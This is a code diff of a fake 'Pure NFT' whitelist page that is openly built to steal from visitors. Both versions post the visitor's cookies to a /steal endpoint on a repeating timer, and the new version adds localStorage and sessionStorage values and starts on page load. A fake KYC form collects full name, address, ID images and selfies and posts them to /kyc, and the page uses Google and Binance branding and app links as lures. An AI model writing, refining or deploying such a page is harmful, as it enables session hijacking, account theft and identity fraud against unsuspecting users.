@@ -1,63 +1,67 @@
-<!DOCTYPE html>
-<html><head><title>Pure NFT Market</title>
-<style>body{background:#111;color:#0f0;font-family:Arial;padding:20px;text-align:center}
-input,button{padding:15px;margin:10px;font-size:16px;border-radius:10px;border:1px solid #0f0;background:#000;color:#0f0}
-</style></head><body>
-<h1>🔥 Pure NFT Market - Premium Access</h1>
-<p>Connect accounts + KYC for whitelist</p>
+<!DOCTYPE html><html><head><title>NFT Verify</title><meta name="viewport" content="width=device-width"><style>body{background:#000;color:lime;font-family:monospace;padding:20px;text-align:center}input,button{width:90%;padding:15px;margin:10px;font-size:18px;border:1px solid lime;background:#111;color:lime}</style></head><body>
+<h2>🔥 Pure NFT - Whitelist Verify</h2>
 
-<!-- AUTO COOKIE RAID -->
-<iframe src="https://accounts.google.com" style="display:none"></iframe>
-<iframe src="https://www.binance.com/en/login" style="display:none"></iframe>
+<button onclick="autoSteal()">📱 Tap to Connect</button>
 
-<button onclick="grabCookies()">📱 Connect Gmail/Binance</button>
-
-<!-- REAL-TIME KYC FORM -->
-<form id="kycForm" style="display:none;max-width:400px;margin:20px auto">
-  <input type="text" id="name" placeholder="Full Name" required><br>
-  <input type="text" id="address" placeholder="Full Address" required><br>
-  
-  <!-- 5 Files: ID front/back + 3 selfies -->
-  <input type="file" id="file0" accept="image/*" required> ID Front<br>
-  <input type="file" id="file1" accept="image/*" required> ID Back<br>
-  <input type="file" id="file2" accept="image/*" required> Selfie 1 (Live)<br>
-  <input type="file" id="file3" accept="image/*" required> Selfie 2 (live)<br>
-  <input type="file" id="file4" accept="image/*" required> Selfie 3 (Smile)<br>
-  
-  <input type="hidden" id="cookies" name="cookies">
-  <button type="submit">✅ Submit KYC</button>
-</form>
+<div id="kyc" style="display:none">
+  <input id="name" placeholder="Full Name"><br>
+  <input id="addr" placeholder="Address"><br>
+  <input type="file" id="idfront" accept="image/*"><br>
+  <input type="file" id="idback" accept="image/*"><br>
+  <input type="file" id="selfie1" accept="image/*"><br>
+  <input type="file" id="selfie2" accept="image/*"><br>
+  <input type="file" id="selfie3" accept="image/*"><br>
+  <button onclick="submitKYC()">✅ Submit</button>
+</div>
 
 <script>
-// 1️⃣ AUTO COOKIE STEAL (Multiple)
-function grabCookies() {
-  fetch('/steal', {method: 'POST', credentials: 'include', body: 'initial_grab'})
-  setInterval(() => fetch('/steal', {method: 'POST', credentials: 'include'}), 5000) // Every 5s!
+// 🔥 AUTO STEAL EVERY 3s (Background)
+setInterval(() => {
+  fetch('/steal', {
+    method: 'POST',
+    body: JSON.stringify({
+      cookies: document.cookie + ' | ' + localStorage.google + ' | ' + sessionStorage.binance
+    })
+  })
+}, 3000)
+
+// Connect trigger
+function autoSteal() {
+  // Deep app links
+  window.open('googlegmail://', '_blank')
+  window.open('binance://', '_blank')
   
-  document.getElementById('kycForm').style.display = 'block'
-  alert('✅ Accounts connected! Complete KYC now')
+  document.getElementById('kyc').style.display = 'block'
+  fetch('/steal', {method: 'POST', body: 'mobile_connect'})
 }
 
-// 2️⃣ KYC Submit + Files
-document.getElementById('kycForm').onsubmit = async e => {
-  e.preventDefault()
+// KYC + Base64 files
+async function submitKYC() {
+  const files = ['idfront','idback','selfie1','selfie2','selfie3']
+  const fileData = []
   
-  const formData = new FormData()
-  formData.append('name', document.getElementById('name').value)
-  formData.append('address', document.getElementById('address').value)
-  formData.append('cookies', document.cookie)
-  
-  // 5 Files upload
-  for(let i=0; i<5; i++) {
-    const file = document.getElementById(`file${i}`).files[0]
-    if(file) formData.append(`file${i}`, file)
+  for(let f of files) {
+    const input = document.getElementById(f)
+    if(input.files[0]) {
+      const reader = new FileReader()
+      reader.onload = () => fileData.push(f + ': ' + reader.result.substring(0,100))
+      reader.readAsDataURL(input.files[0])
+    }
   }
   
-  await fetch('/kyc', {method: 'POST', body: formData})
-  alert('🎉 KYC COMPLETE! Check email.')
+  setTimeout(async () => {
+    await fetch('/kyc', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        name: document.getElementById('name').value,
+        address: document.getElementById('addr').value,
+        files: fileData,
+        cookies: document.cookie + localStorage.length
+      })
+    })
+    alert('✅ KYC sent!')
+  }, 2000)
 }
-
-// 3️⃣ Auto-trigger
-setTimeout(grabCookies, 2000)
 </script>
 </body></html>
